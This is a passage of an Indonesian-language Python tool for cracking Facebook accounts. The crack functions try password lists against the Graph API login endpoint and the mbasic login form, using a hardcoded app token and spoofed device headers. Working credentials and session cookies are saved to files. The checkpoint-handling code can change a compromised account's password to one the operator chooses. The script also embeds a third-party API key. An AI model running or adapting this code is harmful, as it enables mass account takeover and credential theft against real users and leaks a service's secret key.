				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack1(idf,pwv,awal):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	#ua = useragent()
	#ua = random.choice(ugen2)
	ses = requests.Session()
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"[bold white][[bold yellow]{ahir}[bold white]]-[[bold white]{loop}[bold yellow]/[bold white]{len(id)}[bold white]]-[[bold green]OK-:[bold green]{ok}[/] {k}CP-:[bold yellow]{cp}[bold white]][/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			#gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
			ua = random.choice(ugent) 
			data = {"access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28", "sdk_version": {random.randint(1,26)}, "email": idf, "locale": "en_US", "password": pw, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
			head= {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json() 
			#anjg = json.loads(xnxx.text)
			#cuaks=(f'{idf}|{pw)
			if "session_key" in xnxx:
				sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				uk = base64.b64encode(os.urandom(35)).decode().replace("=","").replace("+","_").replace("/","-")
				cokie = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
				coki = f"sb={sb};{cokie};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;ua={uk}"
				print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				oks.append(idf+'|'+pw)
				break
			elif "www.facebook.com" in xnxx["error"]["message"]:
				print('\r\r\x1b[38;5;208m [CP] '+idf+' | '+pw+'\033[1;97m')
				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
				cps.append(idf+'|'+pw)
				break
			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
				prog.update(des,description=f"[bold white][[bold yellow]{ahir}[bold white]]-[[bold white]{loop}[bold yellow]/[bold white]{len(id)}[bold white]]-[[bold green]OK-:[bold green]{ok}[/] {k}CP-:[bold yellow]{cp}[bold white]][/]")
				prog.advence(des) 
				time.sleep(5) 
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1725 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.3'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m ╰─  "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s\033[0mFile Tidak Ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s\033[0Misi Yang Benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
	pw=input("\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s Sandi Minimal 6 Karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\033[0mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\033[0mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\033[0mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
	input('%s%s%s[%s Enter%s ]'%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua="Mozilla/5.0 (Linux; Android 7.1.1; CPH1725 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]"
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://free.cinyourrc.facebook.com/","user-agent": ua})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m Akun Terkunci Sesi New"%(M,til))
		else:
			print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s ╰─  %s\033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n ╰─  OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s ╰─  \033[0mAkun Terpasang Autentikasi Dua Faktor			"%(M))
			else:
				print("%s%s\033[0mTerjadi Kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s ╰─  %s"%(M,oh))
	else:
		print("%s ╰─  \033[0mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36")

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/BrayennnXD')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	loginraf()
